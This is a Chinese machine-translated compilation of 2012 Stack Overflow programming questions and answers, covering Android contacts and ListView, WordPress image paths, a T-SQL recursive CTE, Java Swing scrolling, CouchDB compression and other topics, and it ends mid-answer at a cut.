> 时间：2012-06-12T00:59:24.703

用户控件和自定义控件之间的主要区别在于自定义控件可以重新模板化，即您可以通过提供不同的模板来完全改变它们的视觉效果。如果您不需要在应用程序中执行此操作，我建议您使用用户控件作为一种简单的替代方法。

我写了一篇关于如何在这里创建它们的博客文章：

[在 WPF / Silverlight 中创建可重用用户控件的简单模式](http://www.scottlogic.co.uk/blog/colin/2012/02/a-simple-pattern-for-creating-re-useable-usercontrols-in-wpf-silverlight/)

# javascript - 合并客户端/服务器端模板引擎

> ID：10989210
> 
> 赞同：0
> 
> 时间：2012-06-12T00:36:51.073
> 
> 标签：javascript, templates, node.js, handlebars.js, underscore.js

我即将开始一个使用节点、主干、下划线和 express 的新项目。在视图方面，我使用的是玉。我知道我会有大量类似 ajax 的交互，所以我打算使用把手；但是，我觉得我的玉模板会有大量的代码重复。

1.  有没有办法直接从客户端渲染翡翠模板并填写数据？如何在不填写数据的情况下将请求直接路由到视图？
2.  如果我不能做到以上几点，似乎我实际上有一些我可以使用的模板引擎，下划线、jquery、车把......把所有这些模板引擎放在周围不是浪费吗？我是否应该只使用下划线或 jquery 而不再担心车把？有首选引擎吗？
3.  有没有一些混合方法，我可以像把手一样将数据填充到我的玉模板中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T14:12:02.017

Express 对翡翠模板渲染没有任何作用。只需看一下[公共 api](https://github.com/visionmedia/jade#public-api)，您就知道如何在客户端呈现翡翠视图。对于客户端的路由请求，您可以使用快速作者的[page.js。](https://github.com/visionmedia/page.js)一点点工作和魔法，你就有了在服务器端和客户端使用完全相同的代码的路由，并且两者都呈现为翡翠。

# android - 如何将电话号码更改为android？

> ID：10989211
> 
> 赞同：0
> 
> 时间：2012-06-12T00:37:22.863
> 
> 标签：android, arraylist

**我有这种方法可以在我的收件箱中显示联系电话：**

```
 public ArrayList<String> fetchInboxNumbers() {

    ArrayList<String> sms = new ArrayList<String>();
    Uri uriSms = Uri.parse("content://sms/inbox");
    Cursor cursor = getContentResolver().query(uriSms,
            new String[] { "_id", "address", "date", "body" }, null, null, null);

    cursor.moveToFirst();
    while (cursor.moveToNext()) {

        address = cursor.getString(1); // Displays phone number

        Log.d("CONTACT", address);
        sms.add(address); // + " " + body
    }

    Log.d("NAMES IN CALLLOG", sms.get(7));

    return sms;
} // END FETCHINBOX 
```

我要做的是更改`String address`其联系人姓名。

从`fetchContactNumbers()`和“fetchContactNames（）地址”`, how can I change`到联系人姓名？

理解这一点`fetchContactNumbers`并`fetchContactNames()`保持一致很重要，这意味着`fetchContactNumbers().get(5)`联系人姓名是 fetchContactNames().get(5)`。

最后，`fetchInboxNumbers()`填充自定义适配器。

**此方法返回所有联系人姓名的列表：**

```
public ArrayList<String> fetchContactNames() {

    ArrayList<String> names = new ArrayList<String>();
    Cursor phones = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,
            null, null);
    while (phones.moveToNext()) {

        String name = phones
                .getString(phones
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
        names.add(name);
    }
    phones.close();

    return names;
} 
```

**此方法列出所有电话号码：**

```
public ArrayList<String> fetchContactNumbers() {

    ArrayList<String> numbers = new ArrayList<String>();
    Cursor phones = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,
            null, null);
    while (phones.moveToNext()) {
        String phoneNumber = phones
                .getString(phones
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

        numbers.add(phoneNumber);
    }
    phones.close();

    return numbers;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:49:15.860

您可以使用`CONTENT_FILTER_URI`获取显示名称，而不是分别获取所有名称和数字，如下所示：

```
public ArrayList<String> fetchInboxNumbers() {
    String displayName = "";
    ArrayList<String> sms = new ArrayList<String>();
    Uri uriSms = Uri.parse("content://sms/inbox");
    Cursor cursor = getContentResolver().query(uriSms,
        new String[] { "_id", "address", "date", "body" }, null, null, null);

    cursor.moveToFirst();
    while (cursor.moveToNext()) {
        address = cursor.getString(1); // Displays phone number
        displayName = getDisplayName(address);
        sms.add(displayName); // + " " + body
    }
    return sms;
} // END FETCHINBOX

private String getDisplayName(String phoneNumber) {
    String displayName = ""; 
    Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,      Uri.encode(phoneNumber));
    Cursor cursor = context.getContentResolver().query(uri, new String[] { Phone._ID, Phone.DISPLAY_NAME}, null, null, null);

    if (cursor.moveToFirst()) {

        displayName =  cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
    }
    return displayName;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T04:53:38.337

是拼写错误吗？变量错误？

```
private String getDisplayName(String phoneNyumber) {

    Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.
                            CONTENT_FILTER_URI,      Uri.encode(phoneNumber));
    .....
    } 
```

你的论点是有`phoneNyumber`并且你正在使用`phoneNumber`.

# suds - Python SUDS 没有给出 WebFault 的描述

> ID：10989214
> 
> 赞同：1
> 
> 时间：2012-06-12T00:37:54.543
> 
> 标签：suds

我正在正确创建所有属性，并且我知道我的请求已完成，因为`TypeError`当我添加我的 Web 服务不接受的任何无关字段时，它会给出一个。现在，当我调用方法时，`client.service.Method(attributes...)`我得到了一个`WebFault`，但没有描述 WebFault 发生的原因。以前有没有人遇到过这个问题，或者有人知道这可能意味着什么吗？

回溯是：

```
File "C:/Python25/sudsfirst.py", line 34, in <module>
    result = client.service.Method(arg1,arg2)
File "build\bdist.win32\egg\suds\client.py", line 542 in __call__
    return client.invoke(args, kwargs)
File "build\bdist.win32\egg\suds\client.py", line 602, in invoke
    result = self.send(soapenv)
File "build\bdist.win32\egg\suds\client.py", line 649, in send
    result = self.failed(binding, e)
File "build\bdist.win32\egg\suds\bindings\binding.py", line 265, in get_fault
    raise WebFault(p, faultroot)
WebFault 
```

代码是：

```
url = 'http://blah?wsdl'
client = Client(url)
arg1 = client.factory.create('type1')
arg1.type1 = ...
arg2 = client.factory.create('type2')
arg2.type1 = ...
client.service.Method(arg1, arg2) 
```

抱歉，关于代码，我不能再提及更多了。

# php - Linux：Eclipse PDT 并作为 PHP Web 应用程序运行

> ID：10989215
> 
> 赞同：3
> 
> 时间：2012-06-12T00:38:12.563
> 
> 标签：php, eclipse, eclipse-pdt

我在我的 Ubuntu 机器上安装了用于 PHP 开发的 Eclipse PDT（运行 Apache2 作为服务器），

我尝试创建一个 PHP 项目并将其作为“PHP Web 应用程序”运行，如图所示：

![在此处输入图像描述](../Images/a2dfd0982d93f29c9a430c37d984f22c.png)

但是当我点击“运行”时，浏览器会弹出并给出 404 错误说它找不到`localhost/test/newfile.php`。

Ecipe PDT 是否有自己的内部网络服务器？（如果是这样，我尝试关闭我的 Apache2 ，但仍然给出相同的错误）

最后，作为一种变通方法，我将工作空间位置更改为“/var/www”并在那里创建了我的项目。但想知道它是否是使用 PDT 进行开发的最佳方式？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T09:23:21.670

您提出的问题与 Eclipse PDT 没有直接关系，而是与如何设置开发服务器有关。

我建议不要将项目移动到 webroot 中，而是让 Apache 访问您的开发/项目目录。

有多种方法可以做到这一点：

*   您可以创建一个[符号链接（软链接）](http://en.wikipedia.org/wiki/Symbolic_link)，使 URL-Path 指向一个目录。您需要[允许 Apache 遵循符号链接](http://www.linuxquestions.org/questions/linux-software-2/apache-and-symbolic-links-42393/)。
*   您可以使用该[`Alias`指令](http://httpd.apache.org/docs/current/mod/mod_alias.html)执行类似的操作。
*   `Virtual Hosts`使网络服务器通过其域名指向您要查找的位置。[然后，您可以在您的主机文件](http://en.wikipedia.org/wiki/Hosts_%28file%29)中创建“假”域名，例如`example.com.loc`您网站的本地开发版本。
*   你甚至可以使用`mod_rewrite`它（不是很好的选择）。

正如您所看到的，有多种方法可以以一种可管理的方式实现这一点。根据您的需要，符号链接变体可能最容易完成。如果您需要更高的安全性，该`Alias`指令同样容易实现。如果您更熟悉 apache 配置并且需要对 URL 进行更多控制，那么虚拟主机开始变得有意义（有些软件太笨了，它需要驻留在`/`URL 下方的顶部路径中，否则它就无法工作（是的，废话，但是虚拟主机会来救援）。 `mod_rewrite`“解决方案”只是出于完整性原因而命名，如果您不坚定，`mod_rewrite`并且因为您是 apache 配置的新手，请将其放在您的旁边道路并忽略该建议。

所有这些方式都允许您在服务器上的静态网站旁边拥有一个或多个开发项目。我个人已经在我的 devbox 上配置了虚拟主机，而在我早期的 devbox 上，我只是使用了别名指令。

请记住，如果您编辑了配置，则需要重新启动 apache 服务：

```
$ sudo /etc/init.d/apache2 restart 
```

最重要的是：在编辑配置文件之前，将其复制到备份文件名。始终在编辑配置文件之前对其进行备份。你不想放弃工作设置，相信我；）

# c - C: int 到 _bstr_t

> ID：10989216
> 
> 赞同：1
> 
> 时间：2012-06-12T00:38:41.723
> 
> 标签：c, windows, excel, bstr

我正在尝试使用 c 在 excel 中绘制一系列图。问题是当我尝试在循环中制作绘图时，我必须在 excel 中更改工作表的名称。但这些名称采用 _bstr_t 格式：

```
 pSheet->Name =name; 
```

我想让 name 看起来像 ("Sheet number %d",i)，其中 i 是计数器。我尝试使用 sprintf 和其他方法，但没有运气。

任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-13T03:26:29.037

_bstr_t 类是一个围绕 BSTR 数据类型的 C++ 包装类，它被定义为 WCHAR *。参见例如[BSTR 和 _bstr_t 有什么区别？](https://stackoverflow.com/q/341462/1380680). 如果您正在使用 C，那么您对 ​​_bstr_t 的引用可能不正确，您应该要求转换为 BSTR。

以下代码行可以为您做到这一点：

```
DWORD len;
BSTR  bstrPtr;
char  sheetName[25];

/* Construct the name of your sheet as a regular string */
sprintf(sheetName, "Sheet number %d", i);
/* Count the number of bytes in the WChar version of your name
   by doing a dummy conversion */
len = MultiByteToWideChar(CP_ACP, 0, sheetName, -1, 0, 0);
/* Allocate the BSTR with this size */
bstrPtr = SysAllocStringLen(0, len);
/* Do the actual conversion of the sheetName into BSTR */
MultiByteToWideChar(CP_ACP, 0, sheetName, -1, bstrPtr, len);

/* Do your stuff... */

/* Deallocate the BSTR */
SysFreeString(bstrPtr); 
```

如果您对 _bstr_t 的引用*是*正确的并且此代码没有回答您的问题，那么请发布您正在使用的头文件的片段，显示`name`属性的定义。此外，该语句`pSheet->Name = name`不太可能设置 Excel 工作表的名称，因为这通常涉及调用函数而不是简单地设置属性。理解这一点也需要您提供更多背景信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:42:51.580

首先用名称创建一个字符数组，然后将其分配给名称。

```
char arr[25];
sprintf(arr, "Sheet number %d", i);
pSheet->Name = arr; 
```

# php - 我的 PHP 代码有什么问题？

> ID：10989217
> 
> 赞同：-1
> 
> 时间：2012-06-12T00:38:47.103
> 
> 标签：php, wordpress, image, src

我一直在认真地看着这个！我快疯了，无法弄清楚为什么我的图像没有显示在我的自定义页脚中。

我有firefox和firebug，它只是说url无法加载。所以我将一个 URL 复制并粘贴到当前正在工作的图像中，并且通过 CSS 中的 background 属性显示就可以了。（那是说达科他琼斯的第一名）。复制并粘贴确切的 img src 证明它仍然不起作用。

我的文件夹是图像。我的functions.php 就在外面。层次结构是正确的。有没有搞错？？p 标签中的测试文本工作得很好。呜呼呼呼

来人帮帮我！我正在使用 wp 和 genesis 主题。

```
add_action('genesis_before_footer', 'include_sponsors');
function include_sponsors() { ?>
    <div class="sponsors">
    <p>This is testing text</p>
    <img src="images/dakotajonesheader3.jpg" alt="Smiley face" height="42" width="42" />
    <img src="images/tfobw.png" />
    <img src="images/basskingbw.png" />
    <img src="images/bighawgbw.png" />
    <img src="images/kbw.png" />
    <img src="images/mccoybw.png" />
    <img src="images/nfcbwpng" />
    <img src="images/rayjusbw.png" />
    <img src="images/rrbw.png" />
    </div>  
<?php } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:48:07.673

使用 WordPress 的内置功能：

```
<?php
bloginfo('template_directory'); ?>/images/dakotajonesheader3.jpg
?> 
```

..这将引用/wp-content/themes/your-theme/images/dakotajonesheader3.jpg

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T00:42:19.883

Wordpress 会动态重写 URL，因此您用于访问页面的 URL 与服务器上运行的脚本的路径不同。因此，您可以使用`example.com/Home`. 但是您的图像未存储在 中`example.com/Home/images`，这是您告诉浏览器查看的位置。它们存储在`example.com/wordpress/wp-content/themes/your_theme/images`. `<img>`因此，您必须在标签中将图像的绝对路径提供给浏览器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T00:49:28.780

Carson 是正确的，您可以使用图像的绝对路径。或者，如果您想避免使用绝对路径，您可以使用`bloginfo('template_directory');`

例如：

```
<img src="<?php bloginfo('template_directory'); ?>/images/dakotajonesheader3.jpg" alt="Smiley face" height="42" width="42" /> 
```

# sql-server - T-SQL CTE 应用百分比公式并对每个日期的值求和

> ID：10989218
> 
> 赞同：1
> 
> 时间：2012-06-12T00:38:47.497
> 
> 标签：sql-server, tsql, sum, common-table-expression

我的数据库是关于我的用户的现金余额、交易和隔夜头寸。日期也有差距。

使用 CTE，我选择了两个表，其中包含现金和交易余额总和 [cashtrade_sum] 和头寸 [pos_sum]。这是一个示例：

```
cashtrade_sum
-------------
2012-01-30  10000.00
2012-03-19  9868.99
2012-03-20  9839.02
2012-03-21  10476.10
2012-03-22  0.00
2012-03-23  10102.81
2012-03-26  10314.76
2012-03-27  11037.40
2012-03-28  9887.76
2012-03-29  9234.28
2012-03-30  8718.67
2012-04-02  8396.65
2012-04-03  0.00
2012-04-12  0.00
2012-05-18  1796.78

pos_sum
-------
2012-03-22  17628.00
2012-03-23  0.00
2012-03-28  373.24
2012-03-29  0.00
2012-04-03  20835.00
2012-04-04  20736.00
2012-04-05  20268.00
2012-04-06  20268.00
2012-04-07  20268.00
2012-04-08  20268.00
2012-04-09  20412.00
2012-04-10  19998.00
2012-04-11  18999.00
2012-04-12  11465.00
2012-04-13  10975.00
2012-04-14  10975.00
2012-04-15  10975.00
2012-04-16  9750.00 
```

我必须根据之前的可用日期 [cashtrade_sum] 值对每个 [pos_sum] 值应用佣金公式。结果应添加到当前 [cashtrade_sum] 日期。所以当前日期 [cashtrade_sum] 取决于之前的汇总或减法。

为了清楚起见，简单地说，如何从 [cashtrade_sum] 中减去每个 [pos_sum] 值的 5%，其中当前 [pos_sum] 大于昨天 [cashtrade_sum] 或最大上一个可用日期。假设 [cashtrade_sum] 的值已在上一步中修改。

请帮助它在没有 INSERTions 的情况下即时制作 CTE，并单独获得 5% 的佣金值。像这样：

```
results
-------
                    commission  cash
2012-01-30                      10000.00
2012-03-19                      9868.99
2012-03-20                      9839.02
2012-03-21                      10476.10
2012-03-22          881.4       9594.70
2012-03-23          0.00        9594.70
2012-03-28          0.00        9594.70
2012-03-29          0.00        9594.70
2012-04-03          1041.75     8552.95
2012-04-04          1036.80     7516.12
2012-04-05          1013.40     6502.72
... 
```

最好也填补日期空白，但这只是一个示例。真正的公式要复杂得多。

在 SQL Server 2008 R2 上运行。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T04:51:16.507

好的，所以，这让我很困惑。我想我明白你在找什么，如下所示：

> 对于每一天，“现金”字段被定义为 cashtrade_sum 中的值（如果存在），或者从记录的最后一个日期计算出的 cashtrade_sum 值并减去所有先前的佣金值。如果pos_sum大于前一天的现金，则每个日期的佣金定义为当天pos_sum的5%；否则，佣金为 0 美元。

但是当我实际实施时，数据看起来与您提供的示例结果完全不同，因为您有 3 月 23 日、28 日和 29 日的 cashtrade_sum 值，这些值似乎没有反映在结果中。相反，似乎只要支付了任何佣金，cashtrade_bal 中的所有后续条目都将被忽略，并且现金字段仅因支付的佣金而减少。

所以，我实现了，而不是真正理解为什么。我还添加了一个日历表来进行您提到的日期插值，因此您可以获得每天的值。

```
CREATE TABLE #cashtrade_sum
(
    recdate date,
    balance money
)

create table #pos_sum
(
    recdate date,
    position money
)

INSERT INTO #cashtrade_sum
VALUES
    ('2012-03-01',  10000.00 ),
    ('2012-03-19',  9868.99 ),
    ('2012-03-20',  9839.02 ),
    ('2012-03-21',  10476.10), 
    ('2012-03-22',  0.00 ),
    ('2012-03-23',  10102.81 ),
    ('2012-03-26',  10314.76 ),
    ('2012-03-27',  11037.40 ),
    ('2012-03-28',  9887.76 ),
    ('2012-03-29',  9234.28 ),
    ('2012-03-30',  8718.67 ),
    ('2012-04-02',  8396.65), 
    ('2012-04-03',  0.00 ),
    ('2012-04-12',  0.00 ),
    ('2012-05-18',  1796.78)

INSERT INTO #pos_sum
VALUES
    ('2012-03-22',  17628.00), 
    ('2012-03-23',  0.00),
    ('2012-03-28',  373.24), 
    ('2012-03-29',  0.00 ),
    ('2012-04-03',  20835.00 ),
    ('2012-04-04',  20736.00 ),
    ('2012-04-05',  20268.00 ),
    ('2012-04-06',  20268.00 ),
    ('2012-04-07',  20268.00 ),
    ('2012-04-08',  20268.00 ),
    ('2012-04-09',  20412.00 ),
    ('2012-04-10',  19998.00 ),
    ('2012-04-11',  18999.00 ),
    ('2012-04-12',  11465.00 ),
    ('2012-04-13',  10975.00 ),
    ('2012-04-14',  10975.00 ),
    ('2012-04-15',  10975.00) ,
    ('2012-04-16',  9750.00)

CREATE TABLE #cal
(
    caldate date
)

DECLARE @CurDate date = '2012-03-01';

while @CurDate < '2012-05-01'
BEGIN
    INSERT INTO #cal
    VALUES(@CurDate)

    SELECT @CurDate = DATEADD(day,1,@CurDate)
END

SELECT * FROM #cashtrade_sum;
SELECT * FROM #pos_sum;
SELECT * FROM #cal;

WITH calc AS
(
    SELECT caldate AS calcdate, CAST(0 AS money) AS commission, balance AS dailybal, balance AS runningbal, CAST(0 as money) as position,
        0 as commpaid
    FROM #cal
        left join #cashtrade_sum
            on #cal.caldate = #cashtrade_sum.recdate
    WHERE caldate = (SELECT MIN(caldate) FROM #cal)

    UNION ALL

    SELECT #cal.caldate, 
        comm.commission,
        cts.balance,
        case 
            when prev.commpaid = 1 OR comm.commission > 0 
                then prev.runningbal - comm.commission
            else 
                ISNULL(cts.balance, prev.runningbal - comm.commission) 
        END,
        ps.position,
        CASE WHEN comm.commission > 0 then 1 else prev.commpaid end
    FROM #cal
        outer apply (SELECT * FROM #pos_sum where #cal.caldate = #pos_sum.recdate) ps
        outer apply (SELECT * FROM #cashtrade_sum where #cal.caldate = #cashtrade_sum.recdate) cts
        cross apply (select runningbal, commpaid from calc where calcdate = DATEADD(DAY, -1, #cal.caldate)) prev
        cross apply (select CASE WHEN prev.runningbal < ps.position THEN cast(ps.position * 0.05 as money) ELSE cast(0 as money) END AS commission) comm
)
SELECT calcdate, commission, runningbal FROM calc

drop table #cashtrade_sum
drop table #pos_sum
drop table #cal 
```

请注意，我将第一个日期从 1 月更改为 3 月，因为 SQL Server 具有默认递归限制，该限制将在 100 天的数据后终止此递归 CTE。要使这项工作更长时间，您需要提高递归限制。

我仍然认为您或我对结果的实际外观感到困惑，但这确实会产生您要求的结果。

# java - JScrollPane 不起作用

> ID：10989221
> 
> 赞同：0
> 
> 时间：2012-06-12T00:39:02.957
> 
> 标签：java

嘿伙计们，我想创建一个 JScrollPane 但它不起作用......我不知道为什么......这是我的代码......

```
public class test extends JFrame{
    public test(){      
        setSize(1000,600);

    }

    private static JButton[] remove;
    private static JPanel p = new JPanel();

    public static void main(String[]args){
        p.setLayout(null);
        JFrame t=new test();
        remove = new JButton[25];
        for(int i=0;i<25;i++){
            remove[i]=new JButton("Remove");
            remove[i].setBounds(243,92+35*i,85,25);
            p.add(remove[i]);       
        }
        JScrollPane scrollPane = new JScrollPane(p);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        t.add(scrollPane);
        t.setVisible(true);
    } 
```

嗯，我很确定框架对于这 25 个按钮来说不够大......但是如果我删除它，`p.setLayout(null);`将自动创建一个水平滚动条......我真的不知道我的代码有什么问题......请帮助非常感谢你！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T00:56:17.770

您需要设置 p 的 preferredSize 才能使其正常工作。

```
 p.setPreferredSize(new Dimension(800, 2000)); 
```

或者您可以让 p 扩展 JPanel，然后覆盖 getPreferredSize() 方法以返回正确的尺寸。

我同意——摆脱你的空布局。如果您想正确使用 Swing 并拥有强大的 Swing GUI，请了解并使用布局管理器。

例如，

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class Foo extends JFrame {

   private static final int BUTTON_COUNT = 25;

   public static void main(String[] args) {
      JPanel btnPanel = new JPanel(new GridLayout(0, 1, 0, 20));
      btnPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
      AbstractAction removeAction = new AbstractAction("Remove") {

         @Override
         public void actionPerformed(ActionEvent evt) {
            JButton src = (JButton) evt.getSource();
            JPanel container = (JPanel) src.getParent();
            container.remove(src);
            container.revalidate();
            container.repaint();
         }
      };
      for (int i = 0; i < BUTTON_COUNT; i++) {
         JButton removeBtn = new JButton(removeAction);
         btnPanel.add(removeBtn);
      }
      JPanel borderPanel = new JPanel(new BorderLayout());
      borderPanel.add(btnPanel, BorderLayout.NORTH);
      JScrollPane scrollpane = new JScrollPane(borderPanel,
            JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
            JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
      scrollpane.setPreferredSize(new Dimension(400, 800));

      JFrame frame = new JFrame("Foo");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(scrollpane);
      frame.pack();
      frame.setLocationRelativeTo(null);
      frame.setVisible(true);
   }

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T00:51:01.800

问题是滚动窗格会检查其中的组件是否具有“首选大小”，因此具有空布局的窗格的首选大小为 (0,0)。它忽略了。

你应该按照以下方式做一些事情：

```
p.setPreferredSize(1000,600); 
```

您应该会看到一些滚动条出现，但我不确定它们的准确度。

# database - 为什么 Couchdb 不使用 gzip 压缩我的 SVG 附件？

> ID：10989222
> 
> 赞同：2
> 
> 时间：2012-06-12T00:39:04.790
> 
> 标签：database, http, ubuntu, compression, couchdb

我在**Ubuntu 12.04 LTS**上运行的 Apache **Couchdb 1.2.0**中的附件压缩存在问题。

 **我在蒲团配置部分添加了一个 Content-Type **image/svg+xml**。

附件 | 可压缩类型 | 文本/*、应用程序/javascript、应用程序/json、应用程序/xml、**图像/svg+xml**

local.ini 已正确更新。重新启动 couchdb 后，我上传了一个 svg 文件作为附件。我称之为，Request-Header 似乎没问题（Accept-Encoding：gzip，deflate），但他的 Response-Header 显示没有编码部分（gzip）。文件大小看起来没有压缩。

我在网上找不到解决此问题的方法。你有解决这个问题的方法吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-13T08:28:04.353

这是在 CouchDB 中未正确处理的情况。一种解决方法是将 mime 类型声明为`image/svg\+xml`.

我在 CouchDB 问题跟踪器上打开了一个错误：[https ://issues.apache.org/jira/browse/COUCHDB-1497](https://issues.apache.org/jira/browse/COUCHDB-1497)**

# android - 带有标题的 Android 列表视图

> ID：10989224
> 
> 赞同：1
> 
> 时间：2012-06-12T00:39:31.937
> 
> 标签：android, xml, listview, android-layout, listactivity

我希望我的屏幕有一个带有标题的列表视图。

在我的 XML 文件中，我有一个列表视图，在它上面有一个图像视图，它被用作标题。

当我运行它时，我得到一个错误。我已经阅读了几十个教程，但我看不出我做错了什么。我搜索了 Stackoverflow 并尝试了所有解决方案，但没有任何乐趣。有人可以帮我吗？

注意：我使用的是 Actionbarsherlock，所以我的类扩展了 SherlockListActivity。我已经用 ListActivity 尝试过这个并遇到同样的问题。我也尝试在不实例化图像的情况下运行以查看列表视图是否自行加载，但仍然出现相同的错误。

请在下面查看我的 XML 和代码：

我的 XML

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<ImageView
    android:id="@+id/headerimage"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:src="@drawable/header" >
</ImageView>

<ListView
    android:id="@+id/mylist"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >
</ListView> 
```

我的代码：

```
public class MainActivity extends SherlockListActivity {

public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    ImageView header = (ImageView) findViewById(R.id.headerimage);
    ListView listView = (ListView) findViewById(R.id.mylist);
    String[] values = new String[] { "Android", "iPhone", "WindowsMobile",
    "Blackberry", "WebOS", "Ubuntu", "Windows7", "Max OS X",
    "Linux", "OS/2" };

    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
    android.R.layout.simple_list_item_1, android.R.id.text1, values);

        listView.addHeaderView(header);
    listView.setAdapter(adapter);

} 
```

错误日志

```
E/AndroidRuntime(10642): FATAL EXCEPTION: main
E/AndroidRuntime(10642): java.lang.RuntimeException: Unable to start activity ComponentInfo{ttj.android.t3w/ttj.android.t3w.MainActivity}: java.lang.NullPointerException
E/AndroidRuntime(10642):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1968)
E/AndroidRuntime(10642):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1993)
E/AndroidRuntime(10642):    at android.app.ActivityThread.access$600(ActivityThread.java:127)
E/AndroidRuntime(10642):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1159)
E/AndroidRuntime(10642):    at android.os.Handler.dispatchMessage(Handler.java:99)
E/AndroidRuntime(10642):    at android.os.Looper.loop(Looper.java:137)
E/AndroidRuntime(10642):    at android.app.ActivityThread.main(ActivityThread.java:4507)
E/AndroidRuntime(10642):    at java.lang.reflect.Method.invokeNative(Native Method)
E/AndroidRuntime(10642):    at java.lang.reflect.Method.invoke(Method.java:511)
E/AndroidRuntime(10642):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:790)
E/AndroidRuntime(10642):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:557)
E/AndroidRuntime(10642):    at dalvik.system.NativeStart.main(Native Method)
E/AndroidRuntime(10642): Caused by: java.lang.NullPointerException
E/AndroidRuntime(10642):    at ttj.android.t3w.MainActivity.onCreate(MainActivity.java:40)
E/AndroidRuntime(10642):    at android.app.Activity.performCreate(Activity.java:4465)
E/AndroidRuntime(10642):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
E/AndroidRuntime(10642):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1932)
E/AndroidRuntime(10642):    ... 11 more 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T00:53:28.730

设置页眉和设置页脚采用*膨胀布局*。这意味着为标题创建单独的布局并对其进行膨胀。类似于设置内容视图，但膨胀不会自动发生。一方面不在这里，但显然您需要在设置列表适配器之前设置页眉和页脚。当我有时间时，我会尝试发布一些代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T00:57:35.977

`cstrutton`是正确的。您没有调用 setConentView 您应该在调用`setContentView(R.layout.xmlfilename)`后立即调用`super.onCreate(savedInstanceState);`

`xmlfilename`您的布局文件的名称在哪里

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-25T23:40:17.417

`setContentView(id)`应该与列表活动一起使用，以及包含`ListView`应该扩展`ListActivity`或`ListFragment`（或适当的子类）的活动。

在您对 cstrutton 的评论中，您声明：

> 当我使用 setcontentview 时出现以下错误： E/AndroidRuntime(17767): Caused by: java.lang.RuntimeException: Your content must have a ListView its id attribute is 'android.R.id.list'

这是因为您的 ListView 的 id 不正确 - 在 ListActivity 中，关联的布局文件中最多应该有一个`ListView`，并且它的 id 应该是`@android:id/list`（大概是为了让 Android 知道 ListView 在哪里，尽管我不确定为什么它无法从元素标记中检测到它，也许出于性能原因，需要特定 ID 更简单）。

更改`@+id/list`为`@android:id/list`。（请参阅[此问题](https://stackoverflow.com/questions/8192273/the-meaning-of-android)以了解为什么它是`@android:id`而不是`@+id`）

我想使用类扩展还有其他原因，`ListActivity`其中很多是为了方便方法，但我怀疑很多是为了优化。

向上和向上！

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-06-12T01:54:38.593

固定的。

该活动不应扩展 ListActivity。我将其更改为 Activity 并且问题消失了。

# android - Android listview整个列表被选中

> ID：10989225
> 
> 赞同：12
> 
> 时间：2012-06-12T00:39:35.733
> 
> 标签：android, listview

我似乎遇到了列表视图的 UI 问题。我有一个列表视图并选择列表中的任何项目，突出显示整个列表视图。选择工作正常，我在侦听器中得到了正确的项目。

但问题是，当我选择任何项目时，整个列表视图都会突出显示，因此很难判断选择了哪一行。

这在 Android >3.1 上运行良好 - 目前我正在 2.3 设备上进行测试。

```
<ListView
        android:id="@+id/myList"
        android:layout_width="match_parent"
        android:layout_height="300dp"
        android:layout_marginTop="@dimen/margin_medium"
        android:background="@drawable/border"
        android:listSelector="#99000000"
        android:scrollbarFadeDuration="1000000"
        android:scrollbars="vertical" >
    </ListView> 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-01-29T18:50:43.253

我最近遇到了同样的问题，但原因在于 Android < 3.0 的错误：如果您将 @color 设置为列表项按下选择器的可绘制对象，那么它将填充整个列表区域。解决方案是使用“形状”drawable 而不是@color。

`res/drawable`因此，在具有相似内容的文件夹中创建一个新的 XML 文件：

```
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle">

